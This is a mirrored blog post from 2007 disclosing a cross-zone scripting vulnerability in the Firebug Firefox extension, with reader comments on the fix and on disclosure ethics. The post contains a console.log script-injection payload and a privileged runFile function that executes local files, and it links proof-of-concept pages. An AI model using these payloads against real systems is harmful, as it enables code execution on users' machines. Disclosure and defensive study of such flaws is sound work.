@@ -1,0 +1,575 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/firebug-goes-evil/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:20:52 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Firebug Goes Evil</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Firebug Goes Evil Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Username Enumeration Vulnerabilities' href='../username-enumeration-vulnerabilities/index.html' />
+<link rel='next' title='Application Layer Anti-virus/Firewall' href='../application-layer-anti-virusfirewall/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexbbbf.html?p=191' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-191" class="post">
+	<div class="post-title"><h2><span>Firebug Goes Evil</span></h2></div>
+	<div class="post-date"><span>published:</span> April 4th, 2007</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>Firebug is a very powerful JavaScript debugger for Firefox. <q>I love it!</q> It has tones of useful features like a dynamic console, DOM tree explorer, CSS viewer/editor, script explorer and my favorite, a network monitor where I can see all Flash, XMLHttpRequest, JS and Image requests.</p>
+
+<p>Firebug is mainly used by web developers to find bugs in their code but it can also be used from security guys like me to find and explore various client-side and server-side vulnerabilities. Firebug is my best buddy. I even partially based <a href="../technika/index.html">Technika</a>, the bookmarklets powertool, on the top of Firebug.</p>
+
+<p>Unfortunately, Firebug suffers from rather simple but quite dangerous vulnerability. I have <a href="../cross-context-scripting-with-sage/index.html">discussed</a> similar issues before. In general, browsers try their best to prevent common vulnerabilities from crippling into their code. However, that&#8217;s not the case with browser extensions. Very often, browser extension authors do not consider the security aspects of their work, i.e. extensions are not carefully inspected for security vulnerabilities. Because of this, incidents occur. IMHO, the next wave of browser attacks will target exactly this.</p>
+
+<p>In this post I am going to disclose a vulnerability for Firebug which can be used by attackers to gain control of every system where the Firebug extension is installed. Of course, the user needs to visit a malicious page first, which means that the attack surface is greatly reduced. However, given the fact that the largest user base of the Firefox browser are geeks and Firebug is a top extension at <a href="http://addons.mozilla.org/">http://addons.mozilla.org</a>, attackers can cause quite a lot of trouble.</p>
+
+<p>The vulnerability is of a type Cross-zone or Cross-context scripting, where a script from a web pages is injected inside the zone of the browser, also know as the chrome, or in the zone of the file: protocol. In both cases the result is quite devastating, although the second is a bit less critical then the first. Remote scripts in the browser are restricted by a sandbox. This means that everything that is prefixed with http: or https: is secure. Browser extensions make use of the chrome: protocol. This protocol is not restricted at all and everything is allowed. In that respect, browser extensions are trusted. However if a remote script, tricks the browser into executing JavaScript expressions on chrome: then this script can take control of the entire chrome and also the underplaying operating system because then command execution and read/write file access operations are allowed.</p>
+
+<p>In order to cause Cross-zone scripting in Firebug you need to do the following:</p>
+
+<pre><code>console.log({'&lt;script&gt;alert("bing!")&lt;/script&gt;':'exploit'})</code></pre>
+
+<p>If you put this JavaScript expression into a page and open it with the browser while Firebug is on, you will be prompted with an alert box. This is not very interesting but there is a lot more you can do then that. For example, attackers can easily inject the following function into the browser chrome:</p>
+
+<pre><code>function runFile(f) {
+        var file = Components.classes["@mozilla.org/file/local;1"]
+                .createInstance(Components.interfaces.nsILocalFile);
+
+        file.initWithPath(f);
+
+        var process = Components.classes["@mozilla.org/process/util;1"]
+                .createInstance(Components.interfaces.nsIProcess);
+
+        process.init(file);
+
+        var argv = Array.prototype.slice.call(arguments, 1);
+
+        process.run(true, argv, argv.length);
+}</code></pre>
+
+<p>The function <code>runFile</code> allows execution of files. With the function declaration in the browser chrome, attackers can call <code>console.log</code> a few more times to spawn any file they want or even silently install browser extensions, not to mention that they will be able to read and write the file system too. The possibilities for evilness are endless.</p>
+
+<p>There is a catch though. The Cross-context scripting vector is very tiny. In order to exploit the vulnerability, I needed to go through some extreme things like dynamically composing the malicious payload in a string then evaluating the string content inside the chrome. I wrote two (<a href="../../static/blog/2007/04/firebug-poc.htm">1</a>, <a href="../../static/blog/2007/04/firebug-poc2.htm">2</a>) Proof of Concept exploits that you can try out.</p>
+
+<p><em>It is highly recommended that you disable Firebug until this issue is fixed which I have no doubt that it will be quite soon.</em></p><div class="single-content-bottom-widgets"></div></div>
+	<ul class='post-meta'>
+<li><span class='post-meta-key'>Download:</span> <a href="../../static/blog/2007/04/firebug-payload.js">firebug-payload.js</a>, <a href="../../static/blog/2007/04/firebug-payload.pc">firebug-payload.pc</a></li>
+<li><span class='post-meta-key'>Launch:</span> <a href="../../static/blog/2007/04/firebug-poc.htm">firebug-poc.htm</a>, <a href="../../static/blog/2007/04/firebug-poc2.htm">firebug-poc2.htm</a></li>
+</ul>
+	<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/exploit/index.html" rel="tag">exploit</a> | <a href="../../tags/firebug/index.html" rel="tag">firebug</a> | <a href="../../tags/xpcom/index.html" rel="tag">xpcom</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-12722">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12722">
+			April 4, 2007 at 8:13 pm</a>		</div>
+
+		<div class="message"><a href="http://michaeldaw.org/" rel="nofollow">David Kierznowski</a> has verified the issue and also suggested that not only <strong>console.log</strong> is vulnerable.</div>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12724">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://zeroknock.metaeye.org/' rel='external nofollow' class='url'>Zeroknock</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12724">
+			April 4, 2007 at 9:07 pm</a>		</div>
+
+		<p>Hey pdp</p>
+<p>I am working on the same issue but you got first. Thats good. I think the XPI stuff is going to creat a big problem in upcoming time for the Mozilla.</p>
+<p>Regards</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-12727">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/e6c03dab69dcb70b8e22f7ba45ea0e5b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.codeapollo.com/' rel='external nofollow' class='url'>Delixe</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12727">
+			April 4, 2007 at 9:26 pm</a>		</div>
+
+		<p>That is seriously scary as hell. Good find pdp.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12732">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.metaeye.org/' rel='external nofollow' class='url'>zeroknock</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12732">
+			April 4, 2007 at 9:39 pm</a>		</div>
+
+		<p>Hey pdp</p>
+<p>The proof of code is not working exactly. You got a simple mistake in your code to some extent.This problem i was facing too but resolved it in this way.</p>
+<p>You have to use [form tag] with name under which you will use form properties and objects like button etc. </p>
+<p>In the Javascript layout , you must design a funntion annd pass form as its specified parameter.</p>
+<pre><code>function exploitFirebug(form) {}
+
+&lt;form name="form"&gt;
+Objects
+&lt;/form&gt;</code></pre>
+<p>With new specification the code wont get execute and the error results in this way  &#8220;console.log not defined&#8221;.</p>
+<p>Just sharp a code bit.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-12733">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12733">
+			April 4, 2007 at 9:45 pm</a>		</div>
+
+		<p>Interesting, but the exploit works on my side. So you are saying that you receive errors on your side because I need to put the input elements inside a form? Give me an example. I&#8217;ve tried to exploit on a couple of machines and it worked flawlessly.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12736">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7ef1c803c904b9a9834d3bd7645790bb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://mario.heideri.ch/' rel='external nofollow' class='url'>.mario</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12736">
+			April 4, 2007 at 9:56 pm</a>		</div>
+
+		<p>Great find! Scary find &#8211; as professional webdev I use firebug on a daily basis. Since today always switched on&#8230;</p>
+<p>Again, great find!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-12739">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bd38ec8896a46f6a173c7b80aac0d5be?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Jordan</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12739">
+			April 4, 2007 at 10:13 pm</a>		</div>
+
+		<p>I&#8217;ve always run firebug, but since it causes a bit of a slow down anyway, I always disable it by default except on sites where I explicitly enable it.  Ironically, gnucitizen was one of those sites since I was playing around with carnival a while back.  The list of allowed domains is back down to domains I control&#8230; ;-)</p>
+<p>Good catch, pdp.  I think it&#8217;s time to move my browsing habits into a sandbox&#8230; /me sighs.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12742">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/15cf42a96576559fee2a0f904427b8a0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.joehewitt.com/' rel='external nofollow' class='url'>Joe Hewitt</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12742">
+			April 4, 2007 at 10:56 pm</a>		</div>
+
+		<p>I&#8217;ve released an update to Firebug which fixes this issue.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-12743">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12743">
+			April 4, 2007 at 11:02 pm</a>		</div>
+
+		<p>Thanks Joe,</p>
+<p>This is why I like Firefox Extensions: they get fixed easily and the update is almost instantaneous.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12746">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a0016c8a3b1fd65cc9e4dd2e5f5810b3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Michael</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12746">
+			April 5, 2007 at 12:30 am</a>		</div>
+
+		<p>Thanks for the heads-up.  I use Firebug all the time.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-12766">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.metaeye.org/' rel='external nofollow' class='url'>zeroknock</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12766">
+			April 5, 2007 at 6:21 am</a>		</div>
+
+		<p>Hey</p>
+<p>Not everyone at this point of time have patched this flaw.Still its hold concern.The question about the code is clear by underlined way.</p>
+<p>An Exemplary Layout:</p>
+<pre><code>function sendSpam(fspam)
+{
+
+}</code></pre>
+<p>In body section:</p>
+<pre><code>&lt;form name="fspam"&gt;
+ Calling Objects
+&lt;/form&gt;</code></pre>
+<p>The form has to be passed as a handler.This will make the POC super flawless.The firefox sometimes wont load the variables if not defined in this way.</p>
+<div class="message">The DOM says: Window &#8211; Document &#8211; Form &#8211; Objects.</div>
+<p>Its a good programmin layout free from all type os error functionality.You have to just add few lines of code.</p>
+<p>Regards</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-12769">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12769">
+			April 5, 2007 at 7:19 am</a>		</div>
+
+		<p>gotch you, very weird behaviour though.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-12770">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/324cb21954bb0ed6de3ac977499373f7?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.metaeye.org/' rel='external nofollow' class='url'>zeroknock</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12770">
+			April 5, 2007 at 7:25 am</a>		</div>
+
+		<p>Hey</p>
+<p>Thats what i hate about this browser stuff. Sometimes it work and vice versa.</p>
+<p>But Still we want the things to be done.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12772">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/dcefed997fdd1fe59e9800d12c5f986b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">r4w8173</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12772">
+			April 5, 2007 at 8:17 am</a>		</div>
+
+		<p>It seems that you can disable firebug to prevent the exploitation, but I found out that if you load a local file firebug automatically enables itself even if you have disabled it.</p>
+<p>Nice :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-12777">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12777">
+			April 5, 2007 at 9:07 am</a>		</div>
+
+		<p>r4w8173,</p>
+<p>this is something David Kierznowski suggested as well. It seams that the Firebug disabling features work on http: and https: protocols but not on file:. On file: Firebug is enabled and you cannot do anything about it, unless you completely disable the extension from the Firefox Add-ons dialog.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12835">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/81093448990c40218147633947b83a64?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">C</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12835">
+			April 5, 2007 at 4:23 pm</a>		</div>
+
+		<p>I&#8217;m using Firebug 1.0.1&#8230; is this version safe?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-12881">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.joegrossberg.com/' rel='external nofollow' class='url'>Joe Grossberg</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12881">
+			April 6, 2007 at 12:39 am</a>		</div>
+
+		<p>C:</p>
+<p>No. Upgrade.</p>
+<p>pdp:</p>
+<p>Why would you not have contacted the extension creator directly and waited a day for him to patch it? This seems irresponsible.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-12912">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/15cf42a96576559fee2a0f904427b8a0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.joehewitt.com/' rel='external nofollow' class='url'>Joe Hewitt</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12912">
+			April 6, 2007 at 2:11 am</a>		</div>
+
+		<p>I&#8217;m about to release another Firebug upgrade which adds support for disabling file: URLs.  My apologies for not doing this in the first place.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-12968">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-12968">
+			April 6, 2007 at 7:38 am</a>		</div>
+
+		<div class="message">Thor Larholm has identified another vulnerability in Firebug which by nature is similar to my finding. This vulnerability affects 1.0.3 which means that you should disable Firebug for now. For more information about the new issue click <a href="http://larholm.com/2007/04/06/more-0day-in-firebug/" rel="nofollow">here</a>.</div>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-13066">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/93c8230e89d7a7ba5dd5246aad8bdf08?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://23rdworld.com/' rel='external nofollow' class='url'>mahalie</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-13066">
+			April 6, 2007 at 10:57 pm</a>		</div>
+
+		<p>The above exploit has been fixed as well. Joe is very responsive and I thought it would be worth posting his response on the last link here as well:</p>
+<blockquote><p>Joe Hewitt  says:<br />
+April 6th, 2007 at 3:44</p>
+<p>I have fixed this issue and and released 1.04.</p>
+<p>As you suggested, I now escape all text before inserting it into HTML, rather than leaving it up to the caller. I&#8217;ve also added support for disabling file: urls.</p>
+<p>I hope there aren&#8217;t any more vulnerabilities to be found, but if there are, please give me a day to patch it before you publish. I do appreciate you taking the time to make Firebug more secure, but it&#8217;s better for everyone to have the patch surface before the exploit.</p>
+<p>It is a good think that Firefox has an automatic update system, so every Firebug user should be secured within a few days.</p></blockquote>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-13142">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-13142">
+			April 7, 2007 at 7:14 am</a>		</div>
+
+		<p>Joe G.,</p>
+<p>We often need to take extreme routes to make a point otherwise nobody would listen. However, I knew that Joe Hewitt will patch Firebug very quickly because the extension has one of the cleanest source code structures I have ever seen.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-13191">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.joegrossberg.com/' rel='external nofollow' class='url'>Joe Grossberg</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-13191">
+			April 7, 2007 at 1:46 pm</a>		</div>
+
+		<p>pdp:</p>
+<p>It seems to me that saying &#8220;you have 48 hours to patch, before we publicize the exploit&#8221; would be just as effective in making people listen.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-13390">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/4550629aa60f7ef68d07db76ff7244ec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://larholm.com/' rel='external nofollow' class='url'>Thor Larholm</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-13390">
+			April 8, 2007 at 12:45 pm</a>		</div>
+
+		<p>I don&#8217;t think there is anything extreme about publishing a vulnerability when you find it. sure, Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately, but I fail to see how that is my concern. In that regards I have treated him no worse or better than I have treated Microsoft, Mozilla or Valve in the past.</p>
+<p>This is research that pdp and I have independently performed. We&#8217;re not employees of Microsoft or Firebug, instead we are altruistically researching and publishing the very things that others are also researching &#8211; but keeping private.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-13456">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/f288a8afe5302a16a366d5e9d34f2fec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.joegrossberg.com/' rel='external nofollow' class='url'>Joe Grossberg</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-13456">
+			April 8, 2007 at 9:50 pm</a>		</div>
+
+		<p>&#8220;I don&#8217;t think there is anything extreme about publishing a vulnerability when you find it.&#8221;</p>
+<p>You put software users unnecessarily at risk. That&#8217;s what&#8217;s wrong with it.</p>
+<p>&#8220;I fail to see how that is my concern&#8221;</p>
+<p>Yep, there you go.</p>
+<p>You are not &#8220;altruistically researching&#8221; anything when you don&#8217;t consider what&#8217;s best for the end users?</p>
+<p>There aren&#8217;t just two parties involved in these bug reports &#8212; the software developer and the security researcher &#8212; there is a third group with interests at stake: the thousands, if not millions of end users who are vulnerable.</p>
+<p>You&#8217;re right that you don&#8217;t owe Joe Hewitt anything (though I would opine it would be nice if you extended common courtesy). And you also deserve credit for finding this security hole.</p>
+<p>But you do a huge disservice to all the everyday users like me when you dismiss the possibility that &#8220;Joe could have been away for the Easter holiday visiting his family and therefor not been able to patch it immediately&#8221;.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-14185">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/ecd4038308c7a4f1415662deaf92e7a8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Randolph Finder</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-14185">
+			April 12, 2007 at 9:03 pm</a>		</div>
+
+		<p>I&#8217;m looking for a way to detect the version of Firebug running *without* going into Firefox. Registry Keys, file version of specific files, file version in readme files, or anything like that. I&#8217;m trying to write a detection of vulnerable versions for a network scanner.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-14194">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-14194">
+			April 12, 2007 at 9:21 pm</a>		</div>
+
+		<p>Randolph, so you are saying that you want to detect Firebug remotely? Right now, this is a bit difficult.</p>
+<p>If you want to detect Firebug version without going into Firefox, but still being local, you can just read the install.rdf file from Firebug extension folder which is under the Firefox profile folder.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-123115">
+				<div class="comment-author vcard">
